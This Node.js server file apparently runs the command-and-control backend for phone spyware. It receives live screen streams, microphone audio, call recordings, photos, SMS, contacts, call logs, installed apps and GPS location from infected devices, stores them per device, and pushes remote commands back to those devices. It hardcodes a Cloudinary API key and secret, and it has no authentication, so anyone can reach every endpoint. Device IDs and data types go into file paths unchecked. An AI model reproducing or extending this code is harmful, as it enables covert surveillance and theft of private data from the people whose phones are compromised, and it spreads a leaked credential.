const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');
const cloudinary = require('cloudinary').v2;
const http = require('http'); 
const { Server } = require("socket.io");
const compression = require('compression'); 

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

// Socket Setup
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8, 
    pingTimeout: 60000,     
    pingInterval: 25000,    
    transports: ['websocket', 'polling']
});

// Cloudinary Config
cloudinary.config({
    cloud_name: 'dxnh5vuik',
    api_key: '185953318184881',
    api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
});

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(compression()); 
app.use(cors({ origin: '*' }));
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(__dirname));

let devicesStatus = {}; 

// --- IO Logic ---
io.on('connection', (socket) => {
    socket.on('join', (roomID) => { socket.join(roomID); console.log(`🔌 Joined: ${roomID}`); });
    socket.on('screen-data', (data) => { socket.volatile.to(data.room).emit('screen-data', data.image); });
    socket.on('control-event', (data) => { socket.to(data.room).emit('control-event', data); });
    socket.on('send-command', (data) => {
        if (data.targetId && data.command) {
            io.to(data.targetId).emit('command', data.command);
            if (!devicesStatus[data.targetId]) devicesStatus[data.targetId] = { id: data.targetId };
            devicesStatus[data.targetId].command = data.command;
        }
    });
    socket.on('audio-stream', (blob) => {
        const rooms = socket.rooms;
        for (const room of rooms) { if (room !== socket.id) socket.to(room).emit('audio-stream', blob); }
    });
});

app.get('/', (req, res) => res.send('✅ Server Running with Data Fix!'));

// --- IMAGE UPLOAD ---
app.post('/api/upload-image', (req, res) => {
    let { device_id, image_data, type } = req.body; 
    if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    
    let folderName = "gallery"; 
    let publicId = Date.now().toString(); 

    if (type && type.includes("-")) {
        const parts = type.split("-");  
        folderName = parts[0];  
        publicId = parts[1];    
    } else if (type && type !== "null" && type !== "") {
        folderName = type;
    }

    let folderPath = `${id}/${folderName}`; 
    let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;

    cloudinary.uploader.upload(base64Image, 
        { folder: folderPath, public_id: publicId, resource_type: "image", width: 1280, quality: "auto", fetch_format: "auto" }, 
        (error, result) => {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            io.emit('new-file', { device_id: id, url: result.secure_url, type: folderName });
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

// --- AUDIO UPLOAD ---
app.post('/api/upload-audio', (req, res) => {
    let { device_id, audio_data, filename } = req.body; 
    if (!device_id || !audio_data) return res.status(400).json({ error: "No Data" });
    const id = device_id.toString().trim().toUpperCase();
    
    let folderPath = `${id}/calls`; 
    let base64Audio = audio_data.startsWith('data:audio') ? audio_data : "data:audio/mp4;base64," + audio_data;

    cloudinary.uploader.upload(base64Audio, 
        { folder: folderPath, public_id: filename || Date.now().toString(), resource_type: "video" }, 
        (error, result) => {
            if (error) return res.status(500).json({ error: "Upload Failed" });
            io.emit('new-audio', { device_id: id, url: result.secure_url, name: filename });
            res.json({ status: "success", url: result.secure_url });
        }
    );
});

app.get('/api/audio-history/:device_id', async (req, res) => {
    try {
        const result = await cloudinary.search.expression(`folder:${req.params.device_id.trim().toUpperCase()}/calls AND resource_type:video`).sort_by('created_at', 'desc').max_results(50).execute();
        res.json(result.resources);
    } catch (error) { res.json([]); }
});

app.get('/api/gallery-list/:device_id', (req, res) => {
    cloudinary.api.resources({ type: 'upload', prefix: req.params.device_id.toUpperCase() + "/", max_results: 100, next_cursor: req.query.next_cursor, direction: 'desc', context: true }, 
    (error, result) => {
        if (error) return res.json({ photos: [], next_cursor: null });
        res.json({ photos: result.resources.map(img => img.secure_url), next_cursor: result.next_cursor });
    });
});

// --- STATUS & POLLING ---
app.get('/api/admin/all-devices', (req, res) => res.json(devicesStatus));

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    res.json({ ...device, isOnline: (Date.now() - device.lastSeen) < 60000 });
});

app.post('/api/status', (req, res) => {
    try {
        let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
        if (!device_id) return res.status(400).json({ error: "No ID" });

        const id = device_id.toString().trim().toUpperCase();
        
        if (!devicesStatus[id]) devicesStatus[id] = { id: id, command: "none" };

        devicesStatus[id].model = model || devicesStatus[id].model || "Unknown";
        devicesStatus[id].battery = battery || level || devicesStatus[id].battery || 0;
        devicesStatus[id].version = version || devicesStatus[id].version || "--";
        devicesStatus[id].charging = (String(charging) === "true");
        devicesStatus[id].lat = lat || devicesStatus[id].lat || 0;
        devicesStatus[id].lon = lon || devicesStatus[id].lon || 0;
        devicesStatus[id].lastSeen = Date.now();

        let commandToSend = "none";
        if (devicesStatus[id].command && devicesStatus[id].command !== "none") {
            commandToSend = devicesStatus[id].command;
            devicesStatus[id].command = "none"; // Clear command after sending
        }

        res.json({ status: "success", command: commandToSend });
    } catch (e) { res.status(500).json({ error: "Server Error" }); }
});

// --- 🔥 DATA UPLOAD FIX (Clears Command & Handles Corruption) ---
app.post('/api/upload_data', async (req, res) => { 
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    // 🔥 FIX 1: Agar Data Aa Gaya, To Command Ko 'None' Kar Do (Loop Stop)
    if (devicesStatus[id] && (devicesStatus[id].command === type || devicesStatus[id].command === "sms" || devicesStatus[id].command === "contacts")) {
        console.log(`✅ Command Completed: ${type}. Clearing command for ${id}`);
        devicesStatus[id].command = "none";
    }

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        let finalData = parsedData;

        // 🔥 FIX 2: Contacts Key Handling
        if (type === 'contacts') {
            let rawList = Array.isArray(parsedData) ? parsedData : [parsedData];
            const seenNumbers = new Set();
            finalData = [];
            for (const contact of rawList) {
                // Number clean karo
                let num = (contact.phoneNumber || contact.number || "").replace(/\s+|-/g, '');
                if (num && !seenNumbers.has(num)) {
                    seenNumbers.add(num);
                    finalData.push({ name: contact.name, phoneNumber: num }); // Ensure correct keys
                }
            }
        }
        else if (['installed_apps', 'call_logs'].includes(type)) {
             finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
        } 
        else {
            // SMS Logic - Read old, append new
            let existingData = [];
            try {
                if (fs.existsSync(filePath)) {
                    const fileContent = await fs.promises.readFile(filePath, 'utf8');
                    // Check if file is valid JSON
                    if (fileContent.trim().length > 0) existingData = JSON.parse(fileContent);
                }
            } catch (e) { console.log("File Read Error (Resetting):", e.message); existingData = []; }

            let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            finalData = [...newDataArray, ...existingData].slice(0, 5000); // Limit to 5000
        }

        await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
        res.json({ status: "success" });

    } catch (error) {
        console.error("Write Error:", error);
        res.status(500).json({ status: "error" });
    }
});

app.get('/api/get-data/:device_id/:type', async (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

app.post('/api/send-command', (req, res) => {
    let { device_id, deviceId, command } = req.body;
    let targetID = (device_id || deviceId || "").toUpperCase().trim();

    if (!targetID || !command) return res.status(400).json({ error: "Missing Info" });
    
    io.to(targetID).emit('command', command);
    console.log(`📡 Command Sent: ${command} -> ${targetID}`);

    if (!devicesStatus[targetID]) devicesStatus[targetID] = { id: targetID };
    devicesStatus[targetID].command = command;
    
    res.json({ status: "success", command: command });
});

server.listen(PORT, () => console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`));
